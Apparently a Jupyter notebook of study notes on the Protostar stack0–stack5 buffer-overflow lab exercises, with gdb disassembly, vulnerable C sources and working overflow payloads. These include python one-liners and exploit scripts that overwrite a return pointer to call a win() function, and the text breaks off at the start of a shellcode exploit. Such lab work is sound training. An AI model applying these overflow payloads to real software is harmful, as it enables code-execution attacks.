    "***Interpretation of the assembly:***\n",
    "\n",
    "<pre>\n",
    "    0x080483f4 < main+0 >:   push   %ebp\n",
    "    0x080483f5 < main+1 >:   mov    %esp,%ebp\n",
    "    sets up the stack frame, the old ebp is placed on the stack to save any previous base/reference \n",
    "    pointer\n",
    "    the esp is copied into ebp so we get a new base/reference for the current function\n",
    "    ........................................\n",
    "    0x080483f7 < main+3 >:   and    $0xfffffff0,%esp\n",
    "    aligns the stack to 16 bytes / a 0 is the first address. This might decrease the stack pointer \n",
    "    hence create some empty space\n",
    "    ........................................\n",
    "    0x080483fa < main+6 >:   sub    $0x60,%esp \n",
    "    provides 96 bytes of space on the stack (it grows downward)\n",
    "    ........................................\n",
    "    0x080483fd < main+9 >:   movl   $0x0,0x5c(%esp) \n",
    "    0x08048405 < main+17 >:  lea    0x1c(%esp),%eax \n",
    "    0x08048409 < main+21 >:  mov    %eax,(%esp)\n",
    "    0x0804840c < main+24 >:  call   0x804830c <gets@plt>\n",
    "    gets starts writing at 0x1c(%esp)\n",
    "    0x5c(%esp) is a variable containing 0\n",
    "    this means 0x5c - 0x1c = 0x40 * 16 bytes = 64 bytes of space for the input of gets, \n",
    "    byte number 65 overwrites the 0\n",
    "    ........................................\n",
    "    0x08048411 < main+29 >:  mov    0x5c(%esp),%eax # move the defined 0 into eax\n",
    "    0x08048415 < main+33 >:  test   %eax,%eax # tests of eax is zero\n",
    "    0x08048417 < main+35 >:  je     0x8048427 <main+51> # jumps if eax is zero\n",
    "    which means if we use an input longer than 64 chars, we jump into another block\n",
    "\n",
    "***using gdb***<br>\n",
    "    $ gdb ./stack0\n",
    "    (gdb) disassemble main\n",
    "    (gdb) break *0x08048411\n",
    "    (gdb) run\n",
    "    Starting program: /opt/protostar/bin/stack0 \n",
    "    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
    "    (gdb) x/24wx $esp\n",
    "    0xbffff750:\t0xbffff76c\t0x00000001\t0xb7fff8f8\t0xb7f0186e\n",
    "    0xbffff760:\t0xb7fd7ff4\t0xb7ec6165\t0xbffff778\t0x61616161\n",
    "    0xbffff770:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n",
    "    0xbffff780:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n",
    "    0xbffff790:\t0x61616161\t0x61616161\t0x61616161\t0x61616161\n",
    "    0xbffff7a0:\t0x61616161\t0x61616161\t0x08048400\t0x00000000\n",
    "    starting with 60 a's as an input (\"a\" as the asci code 0x61 shows us 60 a's on the stack and a \n",
    "    zero at the end)\n",
    "    if we want to see the variable containing the zero, we can use:\n",
    "    (gdb) x/wx $esp+0x5c\n",
    "\n",
    "\n",
    "***the original sourcecode was :***\n",
    "<pre>\n",
    "    #include <stdlib.h>\n",
    "    #include <unistd.h>\n",
    "    #include <stdio.h>\n",
    "\n",
    "    int main(int argc, char **argv)\n",
    "    {\n",
    "      volatile int modified; // takes care that the compiler optimization does not touch this variable\n",
    "      char buffer[64];\n",
    "\n",
    "      modified = 0;\n",
    "      gets(buffer);\n",
    "\n",
    "      if(modified != 0) {\n",
    "          printf(\"you have changed the 'modified' variable\\n\");\n",
    "      } else {\n",
    "          printf(\"Try again?\\n\");\n",
    "      }\n",
    "    }\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "## 12.1 Some more practice with Protostar stack1\n",
    "https://warhable.wordpress.com/2017/01/21/walkthrough-protostar-stack1/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "@plt = precedure likage table it is embedding the function which is specified before the \"@\"\n",
    "(gdb) info proc mappings --> shows the memory layout (from where to where goes the stack, sourcecode etc.)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***disassembly of /opt/protostar/bin/stack1***\n",
    "    \n",
    "<pre>\n",
    "    $ gdb ./stack1\n",
    "    0x08048464 < main+0 >:    push   %ebp\n",
    "    0x08048465 < main+1 >:    mov    %esp,%ebp\n",
    "    0x08048467 < main+3 >:    and    $0xfffffff0,%esp # align the stack to 16 bit. speeds up computation\n",
    "    0x0804846a < main+6 >:    sub    $0x60,%esp # reserve 96 byte on the stack\n",
    "    0x0804846d < main+9 >:    cmpl   $0x1,0x8(%ebp) # compare the number of program args with 1\n",
    "    0x08048471 < main+13 >:   jne    0x8048487 <main+35> # if we got anything but no arguments, jump\n",
    "    0x08048473 < main+15 >:   movl   $0x80485a0,0x4( %esp ) # put string address 0x80485a0 on the stack\n",
    "    0x0804847b < main+23 >:   movl   $0x1,(%esp)\n",
    "    0x08048482 < main+30 >:   call   0x8048388 < errx@plt > # print the string and exit program\n",
    "    0x08048487 < main+35>:    movl   $0x0,0x5c(%esp) # write a zero in this variable\n",
    "    0x0804848f < main+43 >:   mov    0xc(%ebp),%eax # 0th function argument (./stack1) \n",
    "    0x08048492 < main+46 >:   add    $0x4,%eax # add 4 to get the 1st function argument (AAAAAAAAAA)\n",
    "    0x08048495 < main+49 >:   mov    (%eax),%eax # dereferencing the pointer to the string\n",
    "    0x08048497 < main+51 >:   mov    %eax,0x4(%esp) # copy the source (pointer to AAAAAAAAA) to the stack\n",
    "    0x0804849b < main+55 >:   lea    0x1c(%esp),%eax # destination to copy to\n",
    "    0x0804849f < main+59 >:   mov    %eax,(%esp) # address which strcpy copies from\n",
    "    0x080484a2 < main+62 >:   call   0x8048368 < strcpy@plt > takes source and destination from esp, esp+4\n",
    "    0x080484a7 < main+67 >:   mov    0x5c(%esp),%eax # load the with 0 initialized variable into eax\n",
    "    0x080484ab < main+71 >:   cmp    $0x61626364,%eax # <---the compare which we want to manipulate\n",
    "    0x080484b0 < main+76 >:   jne    0x80484c0 < main+92 > # jump depending on the compare above\n",
    "    0x080484b2 < main+78 >:   movl   $0x80485bc,(%esp) # -------- path1\n",
    "    0x080484b9 < main+85 >:   call   0x8048398 < puts@plt > # --- path1\n",
    "    0x080484be < main+90 >:   jmp    0x80484d5 < main+113 > # --- path1\n",
    "    0x080484c0 < main+92 >:   mov    0x5c(%esp),%edx # ---------- path2\n",
    "    0x080484c4 < main+96 >:   mov    $0x80485f3,%eax # ---------- path2\n",
    "    0x080484c9 < main+101 >:  mov    %edx,0x4(%esp) # ----------- path2\n",
    "    0x080484cd < main+105 >:  mov    %eax,(%esp) # -------------- path2\n",
    "    0x080484d0 < main+108 >:  call   0x8048378 <printf@plt> # --- path2\n",
    "    0x080484d5 < main+113 >:  leave  \n",
    "    0x080484d6 < main+114 >:  ret  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***Interpretation of the assembly:***\n",
    "\n",
    "<pre>\n",
    "    0x080483f4 < main+0 >:   push   %ebp\n",
    "    0x080483f5 < main+1 >:   mov    %esp,%ebp\n",
    "    sets up the stack frame, the old ebp is placed on the stack to save any previous base/reference pointer\n",
    "    the esp is copied into ebp so we get a new base/reference for the current function\n",
    "    ........................................\n",
    "    0x080483f7 < main+3 >:   and    $0xfffffff0,%esp\n",
    "    aligns the stack to 16 bytes / a 0 is the first address. This might decrease the stack pointer \n",
    "    hence create some empty space\n",
    "    ........................................\n",
    "    0x080483fa < main+6 >:   sub    $0x60,%esp \n",
    "    provides 96 bytes of space on the stack (it grows downward)\n",
    "    ........................................\n",
    "    0x080483fd < main+9 >:   movl   $0x0,0x5c(%esp)\n",
    "    initialize a variable at 0x5c(%esp) with 0\n",
    "    ........................................\n",
    "    x08048471 < main+13 >:   jne    0x8048487 <main+35> \n",
    "    if we got only the program name (stack1) as an argument continue, if we got more than 1 argument \n",
    "    continue with main+35\n",
    "    ........................................\n",
    "    0x08048473 < main+15 >:   movl   $0x80485a0,0x4( %esp ) # put string at address 0x80485a0 on the stack\n",
    "    (gdb) x/s 0x80485a0\n",
    "    0x80485a0:\t \"please specify an argument\\n\"\n",
    "    ........................................\n",
    "    0x0804847b < main+23 >:   movl   $0x1,(%esp)\n",
    "    0x08048482 < main+30 >:   call   0x8048388 < errx@plt > \n",
    "    # print the string specified on the stack to stderr\n",
    "    ........................................\n",
    "    0x08048487 < main+35>:    movl   $0x0,0x5c(%esp)\n",
    "    write a zero in this variable\n",
    "    ........................................\n",
    "    0x0804848f < main+43 >:   mov    0xc(%ebp),%eax\n",
    "    (gdb) x/x $ebp+0xc\n",
    "    0xbffff7a4:\t0xbffff844\n",
    "    (gdb) x/s *0xbffff844\n",
    "    0xbffff963:\t \"/opt/protostar/bin/stack1\"\n",
    "    ........................................\n",
    "    0x08048492 < main+46 >:   add    $0x4,%eax \n",
    "    this only adds 4 bytes to get the next function argument (the provided string to the program)\n",
    "    I ran ./stack1 AAAAAAAAAA\n",
    "    (gdb) x/s *0xbffff848\n",
    "    0xbffff97d:\t \"AAAAAAAAAA\"\n",
    "    ........................................\n",
    "    0x08048495 < main+49 >:   mov    (%eax),%eax\n",
    "    (gdb) x/x 0xbffff848\n",
    "    0xbffff848:\t0xbffff97d\n",
    "    so before eax was pointing to a pointer which was pointing to the string\n",
    "    This pointer got dereferenced such that it directly points to the user input\n",
    "    (gdb) info registers\n",
    "    eax            0xbffff97d\t-1073743491\n",
    "    (gdb) x/x 0xbffff97d\n",
    "    0xbffff97d:\t0x41414141 = hex for AAAAAAAAAA\n",
    "    ........................................\n",
    "    0x08048497 < main+51 >:   mov    %eax,0x4(%esp) \n",
    "    saves eax (pointer to the string) on the stack\n",
    "    ........................................\n",
    "    0x0804849b < main+55 >:   lea    0x1c(%esp),%eax\n",
    "    i guess you have to save the destination address for strcpy in eax\n",
    "    so strcpy would put the first char in 0x1c(%esp), the second in 0x20(%esp), the third in 0x24(%esp), ...\n",
    "    ........................................\n",
    "    0x0804849f < main+59 >:   mov    %eax,(%esp) \n",
    "    put the source for strcpy on the stack\n",
    "    ........................................\n",
    "    0x080484a2 < main+62 >:   call   0x8048368 < strcpy@plt >\n",
    "    execute strcpy with source = (%esp), destination=0x1c(%esp)\n",
    "    (gdb) x/x $esp+0x1c\n",
    "    0xbffff74c:\t0x41414141\n",
    "    (gdb) x/x $esp+0x20\n",
    "    0xbffff750:\t0x41414141\n",
    "    (gdb) x/x $esp+0x24\n",
    "    0xbffff754:\t0x08004141\n",
    "    as expected the hex code for 10 times \"A\" is on the stack starting from 0x1c(%esp)\n",
    "    ........................................\n",
    "    0x080484a7 < main+67 >:   mov    0x5c(%esp),%eax\n",
    "    0x080484ab < main+71 >:   cmp    $0x61626364,%eax \n",
    "    from 0x1c(%esp) to 0x5c(%esp) we need 0x5c - 0x1c = 4*16 = 64 bytes. the 65th byte overwrites \n",
    "    the variable we want to manipulate.\n",
    "    So the solution is to place 64 arbitrary char values followed by \"dcba\" because little endian \n",
    "    switches the order of the letters which results in 0x61626364.\n",
    "    user@protostar:/opt/protostar/bin$ ./stack1 `python -c 'print \"a\"*64 + \"dcba\"'`\n",
    "    you have correctly got the variable to the right value\n",
    "    ........................................\n",
    "    0x080484b0 < main+76 >:   jne    0x80484c0 < main+92 >\n",
    "    0x080484b2 < main+78 >:   movl   $0x80485bc,(%esp)\n",
    "    0x080484b9 < main+85 >:   call   0x8048398 < puts@plt >\n",
    "    0x080484be < main+90 >:   jmp    0x80484d5 < main+113 >\n",
    "    0x080484c0 < main+92 >:   mov    0x5c(%esp),%edx\n",
    "    0x080484c4 < main+96 >:   mov    $0x80485f3,%eax\n",
    "    0x080484c9 < main+101 >:  mov    %edx,0x4(%esp)\n",
    "    0x080484cd < main+105 >:  mov    %eax,(%esp)\n",
    "    0x080484d0 < main+108 >:  call   0x8048378 <printf@plt>\n",
    "    0x080484d5 < main+113 >:  leave  \n",
    "    0x080484d6 < main+114 >:  ret  \n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***the original sourcecode was :***\n",
    "<pre>\n",
    "    #include <stdlib.h>\n",
    "    #include <unistd.h>\n",
    "    #include <stdio.h>\n",
    "    #include <string.h>\n",
    "\n",
    "    int main(int argc, char **argv)\n",
    "    {\n",
    "      volatile int modified;\n",
    "      char buffer[64];\n",
    "\n",
    "      if(argc == 1) {\n",
    "          errx(1, \"please specify an argument\\n\");\n",
    "      }\n",
    "\n",
    "      modified = 0;\n",
    "      strcpy(buffer, argv[1]);\n",
    "\n",
    "      if(modified == 0x61626364) {\n",
    "          printf(\"you have correctly got the variable to the right value\\n\");\n",
    "      } else {\n",
    "          printf(\"Try again, you got 0x%08x\\n\", modified);\n",
    "      }\n",
    "    }\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 12.1 Some more practice with Protostar stack2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "stack1 was a pretty extensive explanation of the assembly code. In stack2 lets make it more compact.\n",
    "First lets see what the program does\n",
    "\n",
    "user@protostar:/opt/protostar/bin$ ./stack2\n",
    "stack2: please set the GREENIE environment variable\n",
    "\n",
    "./stack2 AAAAAAAAAA \n",
    "stack2: please set the GREENIE environment variable\n",
    " \n",
    "user@protostar:/opt/protostar/bin$ export GREENIE=\"AAAAAAAAAA\"\n",
    "user@protostar:/opt/protostar/bin$ ./stack2\n",
    "Try again, you got 0x00000000"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lets look at the disassembly\n",
    "<pre>\n",
    "    0x08048494 < main+0 >:    push   %ebp\n",
    "    0x08048495 < main+1 >:    mov    %esp,%ebp\n",
    "    0x08048497 < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x0804849a < main+6 >:    sub    $0x60,%esp\n",
    "    0x0804849d < main+9 >:    movl   $0x80485e0,(%esp)\n",
    "    0x080484a4 < main+16 >:   call   0x804837c < getenv@plt >\n",
    "    0x080484a9 < main+21 >:   mov    %eax,0x5c(%esp)\n",
    "    0x080484ad < main+25 >:   cmpl   $0x0,0x5c(%esp)\n",
    "    0x080484b2 < main+30 >:   jne    0x80484c8 < main+52 >\n",
    "    0x080484b4 < main+32 >:   movl   $0x80485e8,0x4(%esp)\n",
    "    0x080484bc < main+40 >:   movl   $0x1,(%esp)\n",
    "    0x080484c3 < main+47 >:   call   0x80483bc < errx@plt >\n",
    "    0x080484c8 < main+52 >:   movl   $0x0,0x58(%esp)\n",
    "    0x080484d0 < main+60 >:   mov    0x5c(%esp),%eax\n",
    "    0x080484d4 < main+64 >:   mov    %eax,0x4(%esp)\n",
    "    0x080484d8 < main+68 >:   lea    0x18(%esp),%eax\n",
    "    0x080484dc < main+72 >:   mov    %eax,(%esp)\n",
    "    0x080484df < main+75 >:   call   0x804839c < strcpy@plt >\n",
    "    0x080484e4 < main+80 >:   mov    0x58(%esp),%eax\n",
    "    0x080484e8 < main+84 >:   cmp    $0xd0a0d0a,%eax\n",
    "    0x080484ed < main+89 >:   jne    0x80484fd < main+105 >\n",
    "    0x080484ef < main+91 >:   movl   $0x8048618,(%esp)\n",
    "    0x080484f6 < main+98 >:   call   0x80483cc < puts@plt >\n",
    "    0x080484fb < main+103 >:  jmp    0x8048512 < main+126 >\n",
    "    0x080484fd < main+105 >:  mov    0x58(%esp),%edx\n",
    "    0x08048501 < main+109 >:  mov    $0x8048641,%eax\n",
    "    0x08048506 < main+114 >:  mov    %edx,0x4(%esp)\n",
    "    0x0804850a < main+118 >:  mov    %eax,(%esp)\n",
    "    0x0804850d < main+121 >:  call   0x80483ac < printf@plt >\n",
    "    0x08048512 < main+126 >:  leave  \n",
    "    0x08048513 < main+127 >:  ret  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    0x0804849d < main+9 >:    movl   $0x80485e0,(%esp)\n",
    "    first lets examine what is at $0x80485e0\n",
    "    $ gdb ./stack2\n",
    "    (gdb) break main\n",
    "    (gdb) run\n",
    "    (gdb) x/x $eip\n",
    "    0x804849d <main+9>:\t0xe02404c7\n",
    "    (gdb) x/s 0x80485e0\n",
    "    0x80485e0: \"GREENIE\"\n",
    "    ........................................\n",
    "    0x080484a4 < main+16 >:   call   0x804837c < getenv@plt >\n",
    "    it seems that getenv will get the content of the environment variable GREENIE and write it somewhere,\n",
    "    possibly to eax\n",
    "    (gdb) ni\n",
    "    (gdb) x/s $eax\n",
    "    0xbffff9fc:\t \"AAAAAAAAAA\"\n",
    "    ........................................\n",
    "    0x080484a9 < main+21 >:   mov    %eax,0x5c(%esp)\n",
    "    ok so the environment variable gets copied to 0x5c(%esp)\n",
    "    If the environment variable is not defined  the compare is equal to zero\n",
    "    and the program continues to errx = \"please set the GREENIE environment variable\"\n",
    "    x/s 0x80485e8\n",
    "    0x080484ad < main+25 >:   cmpl   $0x0,0x5c(%esp)\n",
    "    0x80485e8:\t \"please set the GREENIE environment variable\\n\"\n",
    "    0x080484b2 < main+30 >:   jne    0x80484c8 < main+52 >\n",
    "    0x080484b4 < main+32 >:   movl   $0x80485e8,0x4(%esp)\n",
    "    0x080484bc < main+40 >:   movl   $0x1,(%esp)\n",
    "    0x080484c3 < main+47 >:   call   0x80483bc < errx@plt >\n",
    "    ........................................\n",
    "    if the env variable is defined we continue here\n",
    "    repeat (gdb) ni until main+52 got executed / eip points to line main+60\n",
    "    (gdb) x/x $eip\n",
    "    0x80484d0 <main+60>:\t0x5c24448b\n",
    "    0x080484c8 < main+52 >:   movl   $0x0,0x58(%esp)\n",
    "    0x080484d0 < main+60 >:   mov    0x5c(%esp),%eax  \n",
    "    load \"AAAAAAAAAA\" in eax\n",
    "    (gdb) x/x $esp+0x5c\n",
    "    0xbffff77c:\t0xbffff9fc\n",
    "    (gdb) x/s 0xbffff9fc\n",
    "    0xbffff9fc:\t \"AAAAAAAAAA\"\n",
    "    ........................................\n",
    "    0x080484d4 < main+64 >:   mov    %eax,0x4(%esp) # load \"AAAAAAAAAA\" in esp+4#\n",
    "    0x080484d8 < main+68 >:   lea    0x18(%esp),%eax # possibly the destination address for strcpy\n",
    "    0x080484dc < main+72 >:   mov    %eax,(%esp) # destination for strcpy\n",
    "    0x080484df < main+75 >:   call   0x804839c < strcpy@plt >\n",
    "    (gdb) x/x $esp+0x18\n",
    "    0xbffff738:\t0x41414141\n",
    "    0x080484e4 < main+80 >:   mov    0x58(%esp),%eax\n",
    "    0x080484e8 < main+84 >:   cmp    $0xd0a0d0a,%eax\n",
    "    ok so the env variable gets copied into 0x18(%esp) and we have to write 64 bytes to reach 0x58(%esp)\n",
    "    byte 65 has to be 0xd0, byte 66 0xa0, ...\n",
    "    but because of little endian we have to switch the order and end up with:\n",
    "    GREENIE=`python -c 'print \"a\"*64 + \"\\x0a\\x0d\\x0a\\x0d\"'` \n",
    "    ./stack2\n",
    "    0x080484ed < main+89 >:   jne    0x80484fd < main+105 >\n",
    "    0x080484ef < main+91 >:   movl   $0x8048618,(%esp)\n",
    "    0x080484f6 < main+98 >:   call   0x80483cc < puts@plt >\n",
    "    0x080484fb < main+103 >:  jmp    0x8048512 < main+126 >\n",
    "    0x080484fd < main+105 >:  mov    0x58(%esp),%edx\n",
    "    0x08048501 < main+109 >:  mov    $0x8048641,%eax\n",
    "    0x08048506 < main+114 >:  mov    %edx,0x4(%esp)\n",
    "    0x0804850a < main+118 >:  mov    %eax,(%esp)\n",
    "    0x0804850d < main+121 >:  call   0x80483ac < printf@plt >\n",
    "    0x08048512 < main+126 >:  leave  \n",
    "    0x08048513 < main+127 >:  ret  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 13. Buffer Overflows can Redirect Program Execution - bin 0x0D"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "stack3 requires some user input after it gets started <br>\n",
    "./stack3 <br>\n",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa <br>\n",
    "calling function pointer, jumping to 0x61616161 <br>\n",
    "Segmentation fault <br>\n",
    "\n",
    "The segmentation fault did not occur before, lets look at the disassembly what is different to ./stack0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***stack3***\n",
    "<pre>\n",
    "    $gdb ./stack3\n",
    "    (gdb) disas main\n",
    "    0x08048438 < main+0 >:    push   %ebp\n",
    "    0x08048439 < main+1 >:    mov    %esp,%ebp\n",
    "    0x0804843b < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x0804843e < main+6 >:    sub    $0x60,%esp\n",
    "    0x08048441 < main+9 >:    movl   $0x0,0x5c(%esp)\n",
    "    0x08048449 < main+17 >:   lea    0x1c(%esp),%eax\n",
    "    0x0804844d < main+21 >:   mov    %eax,(%esp)\n",
    "    0x08048450 < main+24 >:   call   0x8048330 < gets@plt >\n",
    "    0x08048455 < main+29 >:   cmpl   $0x0,0x5c(%esp)\n",
    "    0x0804845a < main+34 >:   je     0x8048477 < main+63 >\n",
    "    0x0804845c < main+36 >:   mov    $0x8048560,%eax\n",
    "    0x08048461 < main+41 >:   mov    0x5c(%esp),%edx\n",
    "    0x08048465 < main+45 >:   mov    %edx,0x4(%esp)\n",
    "    0x08048469 < main+49 >:   mov    %eax,(%esp)\n",
    "    0x0804846c < main+52 >:   call   0x8048350 < printf@plt >\n",
    "    0x08048471 < main+57 >:   mov    0x5c(%esp),%eax\n",
    "    0x08048475 < main+61 >:   call   *%eax # <---- here a pointer defines a function which is called\n",
    "    0x08048477 < main+63 >:   leave  \n",
    "    0x08048478 < main+64 >:   ret   \n",
    "    \n",
    "The address of this pointer can be manipulated lets see which functions are available in the text segment.\n",
    "(gdb) info functions\n",
    "int main(int, char **);\n",
    "void win(void);\n",
    "\n",
    "(gdb) x win\n",
    "0x8048424 <win>:\t0x83e58955\n",
    "so we could redirect to 0x8048424\n",
    "as before we habe 64 bytes from 0x1c to 0x5c. \n",
    "0x8048424 has 7 digits so we need a leading zero 0x08048424\n",
    "print(64*'a' + '\\x08' + '\\x04' + '\\x84' + '\\x24') # reverse because of little endian\n",
    "print(64*'a' + '\\x24' + '\\x84' + '\\x04' + '\\x08') has to be piped as user input.\n",
    "\n",
    "create a python script called exploit_stack3.py\n",
    "print 64*'a' + '\\x24' + '\\x84' + '\\x04' + '\\x08'\n",
    "python exploit_stack3.py | /opt/protostar/bin/stack3\n",
    "calling function pointer, jumping to 0x08048424\n",
    "code flow successfully changed\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "stack 4 also throws a segmentation fault if we provide a user input which is to long. <br>\n",
    "***stack4***\n",
    "<pre>\n",
    "    (gdb) ./stack4\n",
    "    (gdb) info functions\n",
    "    All defined functions:\n",
    "    File stack4/stack4.c:\n",
    "    int main(int, char **);\n",
    "    void win(void);\n",
    "    (gdb) disas main\n",
    "    0x08048408 < main+0 >:    push   %ebp\n",
    "    0x08048409 < main+1 >:    mov    %esp,%ebp\n",
    "    0x0804840b < main+3 >:    and    $0xfffffff0, %esp\n",
    "    0x0804840e < main+6 >:    sub    $0x50,%esp\n",
    "    0x08048411 < main+9 >:    lea    0x10(%esp),%eax\n",
    "    0x08048415 < main+13 >:   mov    %eax,(%esp)\n",
    "    0x08048418 < main+16 >:   call   0x804830c <gets@plt>\n",
    "    0x0804841d < main+21 >:   leave  \n",
    "    0x0804841e < main+22 >:   ret\n",
    "    \n",
    "    run \n",
    "    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWW\n",
    "    WWXXXXYYYYZZZZ\n",
    "    Program received signal SIGSEGV, Segmentation fault.\n",
    "    0x54545454 in ?? ()\n",
    "    info registers\n",
    "    ebp            0x53535353\t0x53535353\n",
    "    esi            0x0\t0\n",
    "    edi            0x0\t0\n",
    "    eip            0x54545454\t0x54545454\n",
    "\n",
    "    \n",
    "\n",
    "somewhere on the stack the ebp and eip are located and get overwritten with 0x54='T' and 0x53='S'\n",
    "Since we want the instruction pointer to jump to the \"win\"-function we have to provide its address to the instruction pointer. One thing which has to be realized: Not the instruction pointer itself gets overwritten but rather the return pointer which gets written in the instruction pointer!\n",
    "\n",
    "    (gdb) x win\n",
    "    0x80483f4 <win>:\t0x83e58955\n",
    "    \n",
    "    vim /home/user/exploit_stack4.py\n",
    "    write this script in the text-file\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'\n",
    "    eip = struct.pack('I', 0x80483f4)\n",
    "    payload = padding+eip\n",
    "    print(payload)\n",
    "    \n",
    "    user@protostar:/opt/protostar/bin$ python /home/user/exploit_stack4.py | ./stack4\n",
    "    code flow successfully changed\n",
    "    Segmentation fault\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 14. First Exploit! Buffer Overflow with Shellcode - bin 0x0E"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***stack5***\n",
    "<pre>\n",
    "    (gdb) disas main\n",
    "    Dump of assembler code for function main:\n",
    "    0x080483c4 < main+0 >:    push   %ebp\n",
    "    0x080483c5 < main+1 >:    mov    %esp,%ebp\n",
    "    0x080483c7 < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x080483ca < main+6 >:    sub    $0x50,%esp\n",
    "    0x080483cd < main+9 >:    lea    0x10(%esp),%eax\n",
    "    0x080483d1 < main+13 >:   mov    %eax,(%esp)\n",
    "    0x080483d4 < main+16 >:   call   0x80482e8 <gets@plt>\n",
    "    0x080483d9 < main+21 >:   leave  \n",
    "    0x080483da < main+22 >:   ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "It is the same as stack 4 with a different goal. Instead of pointing the instruction pointer to another function we want to let it point to our own shellcode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) run\n",
    "    Starting program: /opt/protostar/bin/stack5 \n",
    "    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWW\n",
    "    (gdb) info registers\n",
    "    ...\n",
    "    ebp            0x53535353\t0x53535353\n",
    "    esi            0x0\t0\n",
    "    edi            0x0\t0\n",
    "    eip            0x54545454\t0x54545454\n",
    "\n",
    "as before the 'T's overwrite the instruction pointer but where should we point it?\n",
    "Well, since we can manipulate the stack why not put assembly instructions there and point to this self-defined function?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Short overview over shellcode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Shellcode is a bunch of hexcode which can directly be interpretet as a binary executable. E.g. the assembly instruction int $0x03 when compiled results in the opcode \\0xcc which the processor interprets as a breakpoint."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***assembly_to_optocde.s***\n",
    "<pre>\n",
    "    .data\n",
    "        HelloWorldString:\n",
    "        .ascii \"Hello World\\n\"\n",
    "    .text\n",
    "    .globl _start\n",
    "    _start:\n",
    "        movl $4, %eax\n",
    "        movl $1, %ebx\n",
    "        movl $HelloWorldString, %ecx\n",
    "        movl $12, %edx\n",
    "        int $0x03\n",
    "        int $0x80\n",
    "        movl $1, %eax\n",
    "        movl $0, %ebx\n",
    "        int $0x80"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ objdump assembly_to_opcode -d\n",
    "    4000b0:  b8 04 00 00 00    mov    $0x4,%eax\n",
    "    4000b5:  bb 01 00 00 00    mov    $0x1,%ebx\n",
    "    4000ba:  b9 d3 00 60 00    mov    $0x6000d3,%ecx\n",
    "    4000bf:  ba 0c 00 00 00    mov    $0xc,%edx\n",
    "    4000c4:  cc                int3   \n",
    "    4000c5:  cd 80             int    $0x80\n",
    "    4000c7:  b8 01 00 00 00    mov    $0x1,%eax\n",
    "    4000cc:  bb 00 00 00 00    mov    $0x0,%ebx\n",
    "    4000d1:  cd 80             int    $0x80"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So after compiling, every assembly line becomes a bytecode"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $gdb ./stack5\n",
    "    (gdb) break 0x080483da\n",
    "    (gdb) run\n",
    "    AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWW\n",
    "    ebp = 0x53535353\n",
    "    eip = 0x54545454\n",
    "    esp = 0xbffff7c0\n",
    "    (gdb) x/x 0xbffff7c0\n",
    "    0xbffff7c0:\t0x55555555\n",
    "    \n",
    "    (gdb) x/1000s $esp\n",
    "    0xbffff7bc:\t \"TTTTUUUUVVVVWW\"\n",
    "    ...\n",
    "    0xbffffa15:\t \"_=/usr/bin/gdb\" <--- the execution with gdb is shown on the stack which means if \n",
    "    we dont execute the program with gdb, the stack addresses for variables might be slightly different. \n",
    "    To cope with that nop instructions will be added later which let the instruction pointer slide along\n",
    "    the nop's until it hits the next real instruction"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As a first try to write opcode on the stack and execute it, lets write int 3 = \\xcc instructions on the stack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    ***exploit_stack5.py***\n",
    "    import struct\n",
